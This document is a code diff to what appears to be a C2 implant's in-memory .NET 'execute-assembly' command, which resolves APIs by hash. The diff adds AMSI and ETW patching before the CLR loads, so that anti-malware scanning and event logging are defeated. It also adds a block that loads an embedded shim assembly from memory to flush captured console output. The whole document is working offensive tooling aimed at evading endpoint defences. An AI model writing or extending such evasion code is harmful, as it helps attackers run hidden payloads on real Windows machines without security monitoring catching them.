@@ -4,6 +4,7 @@
 #include "commands.h"
 #include "common.h"
 #include "evasion/fork_and_run.h"
+#include "evasion/flush_shim.h"
 
 typedef HRESULT (WINAPI *fn_CLRCreateInstance)(REFCLSID, REFIID, LPVOID*);
 typedef HRESULT (WINAPI *fn_SafeArrayAccessData)(SAFEARRAY*, void**);
@@ -158,6 +159,16 @@ VOID cmd_execute_assembly(PINSTANCE inst, PPARSER args, PPACKAGE response) {
 
     // ---- Inline path (original) ----
     DBG(inst, "[ES] cmd_execute_assembly [inline]");
+
+    // Patch AMSI and ETW before loading the CLR. The CLR's Assembly.Load(byte[])
+    // triggers AMSI content scanning via AmsiScanBuffer, and ETW providers log
+    // the load. Patching here covers inline EA the same way powerpick does.
+#ifdef INCLUDE_EVASION_AMSI
+    patch_amsi(inst);
+#endif
+#ifdef INCLUDE_EVASION_ETW
+    patch_etw(inst);
+#endif
 
     fn_CreatePipe pCreatePipe = (fn_CreatePipe)resolve_function(
         inst->Modules.Kernel32, hash_string_djb2(XSTR("CreatePipe")));
@@ -435,6 +446,53 @@ VOID cmd_execute_assembly(PINSTANCE inst, PPARSER args, PPACKAGE response) {
     typedef HRESULT (__stdcall *fn_Invoke3)(void*, VARIANT, SAFEARRAY*, VARIANT*);
     fn_Invoke3 pInvoke3 = (fn_Invoke3)_vtcall(method_info, 37);
     hr = pInvoke3(method_info, v_obj, sa_params, &v_result);
+
+    // ─── Flush CLR managed buffers ───
+    // Console.Out is a managed StreamWriter with an internal byte[] buffer.
+    // After Invoke_3 returns, the buffer is NOT auto-flushed (autoFlush=false
+    // by default). FlushFileBuffers only flushes the kernel pipe buffer.
+    // Fix: load a tiny shim assembly that calls Console.Out.Flush() +
+    // Console.Error.Flush() via the same app domain.
+    {
+        SAFEARRAYBOUND flush_bounds;
+        flush_bounds.lLbound = 0;
+        flush_bounds.cElements = FLUSH_SHIM_SIZE;
+        SAFEARRAY* sa_flush = pSACreate(VT_UI1, 1, &flush_bounds);
+        if (sa_flush) {
+            void* flush_data = NULL;
+            pSAAccessData(sa_flush, &flush_data);
+            es_memcpy(flush_data, (PVOID)FLUSH_SHIM_BYTES, FLUSH_SHIM_SIZE);
+            pSAUnaccessData(sa_flush);
+
+            void* flush_asm = NULL;
+            fn_Load3 pLoad3_ = (fn_Load3)_vtcall(app_domain, 45);
+            HRESULT hr_flush = pLoad3_(app_domain, sa_flush, &flush_asm);
+            if (SUCCEEDED(hr_flush) && flush_asm) {
+                void* flush_mi = NULL;
+                fn_GetEntryPoint pGE = (fn_GetEntryPoint)_vtcall(flush_asm, 16);
+                if (SUCCEEDED(pGE(flush_asm, &flush_mi)) && flush_mi) {
+                    VARIANT v_empty;
+                    es_memset(&v_empty, 0, sizeof(v_empty));
+                    v_empty.vt = VT_EMPTY;
+                    SAFEARRAY* sa_no_args = pSACreateVec(VT_BSTR, 0, 0);
+                    VARIANT v_no_params;
+                    es_memset(&v_no_params, 0, sizeof(v_no_params));
+                    v_no_params.vt = VT_ARRAY | VT_BSTR;
+                    v_no_params.parray = sa_no_args;
+                    SAFEARRAY* sa_fp = pSACreateVec(VT_VARIANT, 0, 1);
+                    LONG zero = 0;
+                    pSAPutElement(sa_fp, &zero, &v_no_params);
+                    VARIANT v_fr;
+                    es_memset(&v_fr, 0, sizeof(v_fr));
+                    fn_Invoke3 pI3 = (fn_Invoke3)_vtcall(flush_mi, 37);
+                    pI3(flush_mi, v_empty, sa_fp, &v_fr);
+                    pSADestroy(sa_fp);
+                    pSADestroy(sa_no_args);
+                }
+            }
+            pSADestroy(sa_flush);
+        }
+    }
 
     // Flush the CLR's buffered output: the Console.Out StreamWriter holds an
     // internal buffer that doesn't auto-flush on assembly exit. Closing the
